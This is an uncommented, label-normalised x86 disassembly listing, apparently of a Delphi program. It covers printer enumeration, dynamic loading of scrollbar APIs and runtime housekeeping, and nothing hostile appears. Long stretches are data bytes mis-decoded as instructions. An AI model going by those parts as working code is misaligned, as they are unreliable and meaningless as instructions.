mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_42593c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026e4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42592b
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_403ab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425986
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_404074
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_402704
retn
inc eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_424ffc
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c8
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_404248
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c8
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_408d10
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_424ffc
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_425990
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425b6d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_407b74
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_425b2d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_424ffc
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_402704
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_425750
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40cb00
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x41c ]
call sub_425030
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_404510
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_404510
push eax
mov eax [ ebx + 0x8 ]
call sub_404510
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4254dc
call sub_403ab4
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_404248
mov edx [ ebp - 0x420 ]
pop eax
call sub_407ddc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b74
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_404074
retn
sub_425b90
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40d19c
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403294
inc edi
dec ebx
jne r-xdata
sub_425bf8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425c29
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c30
retn
mov eax [ rw-data ]
call sub_403294
sub_425c3c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_425c70
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_425c98
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_425f1a
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425f41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f48
retn
sub_425f5c
test al 0x5f
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x400425f ] dh
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x60280040 ] al
inc edx
add [ eax ] ch
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0xc ] si
pushad
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc edx
add [ eax + eax ] bl
add [ eax ] al
pop esp
pop edi
inc edx
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x60 ] dh
inc edx
add [ eax - 0x53ffbda0 ] ah
pushad
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
mov eax esi
call sub_403284
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_426030
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_426070
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4260c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4260ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4260f4
retn
sub_426100
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_4260b8
xor eax eax
push ebp
push sub_4262b7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262be
mov eax [ rw-data ]
call sub_4260c0
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_4262c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_4260b8
xor eax eax
push ebp
push sub_426673
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42667a
mov eax [ rw-data ]
call sub_4260c0
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_426a24
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_426a4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426a94
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426a9b
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403294
call sub_426100
cmp [ rw-data ] 0x0
jg r-xdata
sub_426abc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426ae1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ae8
retn
sub_426af4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426b19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b20
retn
sub_426b2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426b51
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b58
retn
sub_426b64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426b89
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b90
retn
sub_426b9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426bc1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426bc8
retn
sub_426bd4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426bf9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c00
retn
sub_426c3d
dec [ ebx - 0x1374aa40 ]
xor eax eax
push ebp
push sub_426c65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c6c
retn
sub_426cb0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426cd5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cdc
retn
sub_426ce8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426d0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d14
retn
sub_426d24
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add ah dh
add [ edx ] 0xffffffec
test [ edx ] al
nop
sub al [ eax ]
add eax 0x10000200
add [ edx - 0x11001100 ] eax
[ eax - 0x3fffbd7c ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 2 + 0x6dcc0042 ] ch
inc edx
add [ eax ] bl
add [ eax ] al
or [ edx ] ch
inc ecx
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add [ esp + eax * 4 ] bl
inc edx
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al al
add [ edx ] 0x50
dec eax
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax - 0x7d ] bh
inc edx
add [ eax - 0xbffbd7c ] ah
sub_4276f4
mov esp 0xb004290
push esp
inc esi
outsd
outsb
je r-xdata
add al 0x46
outsd
outsb
je r-xdata
imul esp [ ecx + 0x6c ] 0x7708676f
inc edx
add [ edi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
pop eax
add [ eax ] al
[ ebx + edx * 4 ]
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ ecx + 0x6c ] 0x76b0676f
inc edx
add ah bl
insd
inc edx
add [ eax + eax ] cl
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x673676f
add [ eax ] bl
les eax [ ecx ]
jpe r-xdata
pop es
add [ esi ] al
inc esp
jbe r-xdata
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec edi
jo r-xdata
arpl [ ebp + 0x54 ] sp
adc [ eax ] al
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ ebp + 0x69 ]
outsb
inc ecx
jo r-xdata
push esp
adc [ eax ] al
add [ eax + 0x48 ] dl
imul ebp [ edi + 0x6e ] 0x42762c73
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000b ] al
outsb
insb
add [ eax ] al
[ eax + eax ]
imul edi [ edx + 0x65 ] r-xdata
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax - 0x7d ] bh
inc edx
add [ eax - 0xbffbd7c ] ah
add [ edx ] 0xffffffec
test [ edx ] al
add al 0x96
inc edx
add [ ebx ] dl
push esp
push eax
jb r-xdata
insb
jns r-xdata
jo r-xdata
outsb
je r-xdata
inc esi
outsd
outsb
je r-xdata
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
inc eax
add [ eax + 0x78 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4278 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x58004278 ] cl
add [ eax ] al
add [ eax ] ah
insd
inc edx
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add [ esp + eax * 4 ] bl
inc edx
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al al
add [ edx ] 0x50
dec eax
or dh [ eax + 0x73 ]
outsd
adc al 0x70
jb r-xdata
mov eax eax
loopne r-xdata
imul ebp [ esi + 0x73 ] 0x6f73700d
dec ebp
je r-xdata
je r-xdata
inc esp
popa
jne r-xdata
imul ebp [ edi + 0x6e ] 0x1
je r-xdata
imul ebp [ esi + 0x74 ] 0x724f0b02
imul esp [ ebp + 0x6e ] 0x69746174
inc edx
or dh [ eax + 0x73 ]
jo r-xdata
imul esi [ ebx + 0x61 ] 0x50656c62
imul ebp [ esi + 0x4d ] 0x69677261
outsb
jae r-xdata
jo r-xdata
jb r-xdata
inc esp
imul esi [ ebx + 0x61 ] 0x50656c62
popad
push eax
jae r-xdata
add [ eax + esi * 2 ] dl
adc [ eax + 0x73 ] esi
jo r-xdata
je r-xdata
or [ gs : eax + edx * 2 + 0x61 ] edx
push esp
jns r-xdata
add cl [ ebx ]
dec edi
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah bl
jns r-xdata
push eax
popad
jo r-xdata
imul ebp [ esi + 0x67 ] 0x6f737012
je r-xdata
outsd
pop ss
push esp
jb r-xdata
adc eax 0x446f7370
jo r-xdata
je r-xdata
add [ ebx ] al
imul ebp [ edi + 0x6e ] 0x78cc0373
inc edx
imul ebp [ esi + 0x4d ] 0x69677261
outsb
jae r-xdata
or eax 0x4d6f7370
jo r-xdata
push eax
popad
push ebx
je r-xdata
outsd
inc esp
push ebx
push 0x6548776f
insb
imul ebp [ bp + 0x73 ] 0x6f73700b
imul esi [ ebx + 0x61 ] 0x4f656c62
imul ebp [ esi + 0x73 ] 0x6f737015
inc esp
jo r-xdata
imul esp [ ecx + 0x6c ] 0x78a0676f
inc edx
add [ edi ] al
adc edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x65537265
je r-xdata
popad
jb r-xdata
push 0x44077365
add [ gs : ebx ] ecx
popad
jae r-xdata
outsb
je r-xdata
outsb
add [ edx ] cl
jo r-xdata
jb r-xdata
jb r-xdata
popad
outsd
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x9 ] si
outsb
jbe r-xdata
dec esi
outsd
dec esi
je r-xdata
adc dh [ eax + 0x73 ]
jo r-xdata
jb r-xdata
jo r-xdata
jo r-xdata
outsd
push edi
popad
jb r-xdata
outsb
je r-xdata
outsd
inc esp
imul esi [ ebx + 0x61 ] 0x4d656c62
popad
jb r-xdata
popad
jo r-xdata
or [ eax + 0x61 ] edx
